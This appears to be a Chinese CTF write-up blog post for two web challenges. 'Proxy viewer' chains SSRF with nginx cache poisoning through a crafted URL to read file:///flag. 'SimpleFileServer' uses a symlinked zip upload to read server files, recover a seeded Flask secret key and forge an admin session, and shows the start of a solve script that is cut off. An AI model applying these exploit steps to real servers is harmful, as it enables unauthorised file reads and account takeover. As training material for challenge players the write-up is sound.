src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364132581-f229561f-16d2-44ae-9e67-410aacdf512d.png#averageHue=%23f4f4f4&clientId=ud3b2cc69-f72a-4&from=paste&height=78&id=ub6d89b39&name=image.png&originHeight=97&originWidth=659&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1362&status=done&style=none&taskId=u34f73218-d69d-4242-bbc6-8e0e4d5d8bd&title=&width=527.2" alt="image.png"></p>
<h1 id="Proxy-viewer"><a href="#Proxy-viewer" class="headerlink" title="Proxy viewer"></a>Proxy viewer</h1><p>考点：Nginx缓存和urlopen特性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(</span><br><span class="line">        __name__,</span><br><span class="line">        static_url_path=<span class="string">&#x27;/static&#x27;</span>,</span><br><span class="line">        static_folder=<span class="string">&#x27;./static&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">PREMIUM_TOKEN = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">limiter = Limiter(app, key_func=get_remote_address)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_headers</span>(<span class="params">response</span>):</span><br><span class="line">    response.cache_control.max_age = <span class="number">120</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;10/minute&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    remote_addr = request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>) <span class="keyword">or</span> request.remote_addr</span><br><span class="line">    is_authorized = request.headers.get(<span class="string">&#x27;X-Premium-Token&#x27;</span>) == PREMIUM_TOKEN <span class="keyword">or</span> remote_addr == <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = urlopen(path, timeout=<span class="number">.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized)</span><br><span class="line">    <span class="keyword">if</span> is_authorized:</span><br><span class="line">        output = page.read().decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;page.headers.as_string()&#125;</span>&lt;/pre&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized, content=output)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/premium&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">premium</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;we&#x27;re sorry, but premium membership is not yet available :( please check back soon!&quot;</span></span><br><span class="line"></span><br><span class="line">serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到题目给出了一个SSRF的点，假如XFF头为本地那么就进去，是不是直接价格127.0.0.1进去就完事了呢？可以看看nginx的配置：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> mime.types;</span><br><span class="line">    <span class="attribute">proxy_cache_path</span> /tmp/nginx keys_zone=my_zone:<span class="number">10m</span> inactive=<span class="number">60m</span> use_temp_path=<span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1337</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span> <span class="number">64M</span>;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">	    <span class="attribute">proxy_cache</span> my_zone;</span><br><span class="line">	    <span class="attribute">add_header</span> X-Proxy-Cache <span class="variable">$upstream_cache_status</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到他会在<code>/</code>后面的路由都加上一个XFF头，内容是<code>$proxy_add_x_forwarded_for</code>，这是啥意思呢？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678409334926-9c6ae44d-8fe9-4d8b-ae16-27026538bc0f.png#averageHue=%23f8f7f6&clientId=u41114c66-86cd-4&from=paste&height=255&id=u95c64d4c&name=image.png&originHeight=319&originWidth=981&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34452&status=done&style=none&taskId=ub21e47e9-dbbf-42cb-8440-94596a726de&title=&width=784.8" alt="image.png"><br>他会在我们自定义的xff头后面再追加一个真实ip，因此无法伪造，也就无法利用这一点进行SSRF，但是nginx配置中有一点<code>^~ /static/</code>，他会对<code>/static</code>路由下的请求进行缓存，然后我还要介绍python中urlopen的一个trick</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@full_url.setter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full_url</span>(<span class="params">self, url</span>):</span><br><span class="line">  <span class="comment"># unwrap(&#x27;&lt;URL:type://host/path&gt;&#x27;) --&gt; &#x27;type://host/path&#x27;</span></span><br><span class="line">  self._full_url = unwrap(url)</span><br><span class="line">  self._full_url, self.fragment = _splittag(self._full_url)</span><br><span class="line">  self._parse()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_splittag</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;splittag(&#x27;/path#tag&#x27;) --&gt; &#x27;/path&#x27;, &#x27;tag&#x27;.&quot;&quot;&quot;</span></span><br><span class="line">    path, delim, tag = url.rpartition(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> delim:</span><br><span class="line">        <span class="keyword">return</span> path, tag</span><br><span class="line">    <span class="keyword">return</span> url, <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>urlib会自动去除你请求的#，但是这个对urllib的版本有要求，比如我py3.7中默认的urllib就不长这样子，具体能不能行另说，知道这个trick就好<br>因此我们可以先输入<code>http://localhost:5000/proxy/http://localhost:5000/proxy/file:///flag%2523/../../../static/a</code><br>输入过后python的urllib会解析为<code>http://localhost:5000/proxy/file:///flag</code>,这里相当于套了个娃,然后第二层里面又解析为<code>file:///flag</code>，在第二层nginx会解析为:<code>http://localhost:1337/staic/a</code>，因此缓存<code>/proxy/file:///flag%23/../../../static/a</code>这个路由，我们只要再次访问该路由即可获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678411164342-96713e92-38d0-4436-8f17-358b223c4e75.png#averageHue=%232c2c2c&clientId=u41114c66-86cd-4&from=paste&height=614&id=u045a99c3&name=image.png&originHeight=767&originWidth=1270&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=125107&status=done&style=none&taskId=u4960b363-1a7d-4fa3-98c8-064c696953e&title=&width=1016" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678411170800-55e3883b-a21e-4699-8d56-24f67d9fe72e.png#averageHue=%232d2c2c&clientId=u41114c66-86cd-4&from=paste&height=625&id=u4b2e7312&name=image.png&originHeight=781&originWidth=1387&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212618&status=done&style=none&taskId=u91f1ecef-de10-49b8-8e65-6524b2ddca4&title=&width=1109.6" alt="image.png"></p>
<h1 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h1><p>考点：symlink软连接hook任意文件读取，flask session伪造<br>这里其实涉及一个小tips，那就是软连接<code>ln</code>,在学linux的时候也学到了这东西，假如我们可以文件上传并且可以读取上传的文件，那么这时候软连接就派上用场了，拿这一题为例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, flash, redirect, render_template, request, abort,</span><br><span class="line">                   send_from_directory, session)</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash, generate_password_hash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">DATA_DIR = <span class="string">&quot;/tmp/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uploads can only be 2MB in size</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1000</span> * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">LOG_HANDLER = logging.FileHandler(DATA_DIR + <span class="string">&#x27;server.log&#x27;</span>)</span><br><span class="line">LOG_HANDLER.setFormatter(logging.Formatter(fmt=<span class="string">&quot;[&#123;levelname&#125;] [&#123;asctime&#125;] &#123;message&#125;&quot;</span>, style=<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;application&quot;</span>)</span><br><span class="line">logger.addHandler(LOG_HANDLER)</span><br><span class="line">logger.propagate = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logging.root.handlers[:]:</span><br><span class="line">    logging.root.removeHandler(handler)</span><br><span class="line">logging.basicConfig(level=logging.WARNING, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;</span>)</span><br><span class="line">logging.getLogger().addHandler(logging.StreamHandler())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set secret key</span></span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    session.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    username = request.form.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(DATA_DIR + <span class="string">&quot;database.db&quot;</span>) <span class="keyword">as</span> db:</span><br><span class="line">        res = db.cursor().execute(<span class="string">&quot;SELECT password, admin FROM users WHERE username=?&quot;</span>, (username,))</span><br><span class="line">        user = res.fetchone()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> <span class="keyword">not</span> check_password_hash(user[<span class="number">0</span>], password):</span><br><span class="line">            flash(<span class="string">&quot;Incorrect username/password&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    session[<span class="string">&quot;uid&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;admin&quot;</span>] = user[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    session.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    username = request.form.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password <span class="keyword">or</span> <span class="keyword">not</span> re.fullmatch(<span class="string">&quot;[a-zA-Z0-9_]&#123;1,24&#125;&quot;</span>, username):</span><br><span class="line">        flash(<span class="string">&quot;Invalid username/password&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(DATA_DIR + <span class="string">&quot;database.db&quot;</span>) <span class="keyword">as</span> db:</span><br><span class="line">        res = db.cursor().execute(<span class="string">&quot;SELECT username FROM users WHERE username=?&quot;</span>, (username,))</span><br><span class="line">        <span class="keyword">if</span> res.fetchone():</span><br><span class="line">            flash(<span class="string">&quot;That username is already registered&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        db.cursor().execute(<span class="string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, generate_password_hash(password)))</span><br><span class="line">        db.commit()</span><br><span class="line">    </span><br><span class="line">    session[<span class="string">&quot;uid&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;admin&quot;</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;uid&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        flash(<span class="string">&quot;You didn&#x27;t upload a file!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">    uuidpath = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploadraw/<span class="subst">&#123;uuidpath&#125;</span>.zip&quot;</span></span><br><span class="line">    file.save(filename)</span><br><span class="line">    subprocess.call([<span class="string">&quot;unzip&quot;</span>, filename, <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;</span>])    </span><br><span class="line">    flash(<span class="string">f&#x27;Your unique ID is &lt;a href=&quot;/uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;&gt;<span class="subst">&#123;uuidpath&#125;</span>&lt;/a&gt;!&#x27;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;User <span class="subst">&#123;session.get(<span class="string">&#x27;uid&#x27;</span>)&#125;</span> uploaded file <span class="subst">&#123;uuidpath&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uploads</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(DATA_DIR + <span class="string">&quot;uploads&quot;</span>, path)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;admin&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.run(<span class="string">&quot;./flag&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>逻辑其实很简单，想办法伪造admin的session，那就要想办法获取SECRET_KEY了，我们看看逻辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">SECRET_OFFSET = <span class="number">0</span> <span class="comment"># REDACTED</span></span><br><span class="line">random.seed(<span class="built_in">round</span>((time.time() + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>他由2个要点构成：</p>
<ul>
<li>time.time()</li>
<li>SECRET_OFFSET</li>
</ul>
<p>只要知道了上面2个要素，就知道了random的seed值，那我们就可以伪造admin session从而获取flag，那现在需要思考的也就是如何如何获取了，首先是time，可以看app文件里，题目好心的在日志里输出了时间：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678421333463-5ac5fdb8-9b9f-439a-ab1e-87e77d816322.png#averageHue=%231f2125&clientId=u41114c66-86cd-4&from=paste&height=231&id=uf1ad138b&name=image.png&originHeight=289&originWidth=1200&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49598&status=done&style=none&taskId=u36fc268c-77c4-4dfb-897a-3ae27f7ed9d&title=&width=960" alt="image.png"><br>然后SECRET_KEY放在了config.py文件里，因此现在的思路就很清晰了，直接构造server.log和config.py文件的软连接然后读下来即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678421715612-3a0ff182-9610-475c-860f-585227903673.png#averageHue=%23423e31&clientId=u41114c66-86cd-4&from=paste&height=335&id=udc16631c&name=image.png&originHeight=419&originWidth=1238&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=502612&status=done&style=none&taskId=u2b5f35fb-bf07-4fd5-864e-519b4442a69&title=&width=990.4" alt="image.png"><br>接下来直接放一下y4爷的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, re, time, datetime, random</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">SECRET_OFFSET = -<span class="number">67198624</span> * <span class="number">1000</span></span><br><span class="line">userinfo = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yyds&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;yyds&quot;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&quot;http://127.0.0.1:1337/&quot;</span></span><br><span class="line">pocZip = <span 